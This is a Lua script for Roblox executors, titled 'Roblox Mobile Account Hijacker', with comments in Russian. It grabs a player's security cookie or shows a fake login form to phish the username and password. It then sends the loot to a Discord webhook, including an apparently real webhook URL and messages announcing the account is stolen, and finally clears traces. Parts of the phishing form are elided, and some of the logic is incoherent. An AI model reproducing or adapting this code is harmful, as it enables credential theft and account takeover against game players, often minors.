--[[  
  Roblox Mobile Account Hijacker  
  Работает в Bluestacks + Delta Executor (вшитый)  
]]  

local http = (syn and syn.request) or (http and http.request) or request  
local webhook = "https://discord.com/api/webhooks/ВАШ_WEBHOOK"  

-- 1. Попытка получить куки (мобильная версия)  
local cookie = game:GetService("Players").LocalPlayer:GetAttribute("RobloxSecurityToken")  
if not cookie then  
    cookie = game:HttpGet("https://discord.com/api/webhooks/1390990968303521902/SJF_6Q9tQC7TlzJxYoOiqUgDVelH4MDMOY-b8KF-3EDFKkOODnl2o57LTd98NkQvuHr6", true)  
end  

-- 2. Если куки нет → фишинг через GUI  
if not cookie then  
    local gui = Instance.new("ScreenGui")  
    local frame = Instance.new("Frame")  
    local textBoxUser = Instance.new("TextBox")  
    local textBoxPass = Instance.new("TextBox")  
    local submit = Instance.new("TextButton")  

    -- ... (код фейковой формы, как в предыдущем скрипте)  

    local username, password = textBoxUser.Text, textBoxPass.Text  
    if username and password then  
        http({  
            Url = webhook,  
            Method = "POST",  
            Headers = {["Content-Type"] = "application/json"},  
            Body = game:GetService("HttpService"):JSONEncode({  
                ["content"] = "РОБЛОКС АККАУНТ УКРАДЕН (МОБИЛЬНАЯ ВЕРСИЯ)",  
                ["embeds"] = {{  
                    ["title"] = "Данные для входа",  
                    ["description"] = "Логин: " .. username .. "\nПароль: " .. password .. "",  
                    ["color"] = 16711680  
                }}  
            })  
        })  
    end  
else  
    -- 3. Если куки есть → отправляем их  
    http({  
        Url = webhook,  
        Method = "POST",  
        Headers = {["Content-Type"] = "application/json"},  
        Body = game:GetService("HttpService"):JSONEncode({  
            ["content"] = "РОБЛОКС COOKIE УКРАДЕНЫ (МОБИЛЬНАЯ ВЕРСИЯ)",  
            ["embeds"] = {{  
                ["title"] = "Cookie",  
                ["description"] = "" .. cookie .. "",  
                ["color"] = 16711680  
            }}  
        })  
    })  
end  

-- 4. Чистка следов  
if _G["RobloxHackModule"] then _G["RobloxHackModule"] = nil end
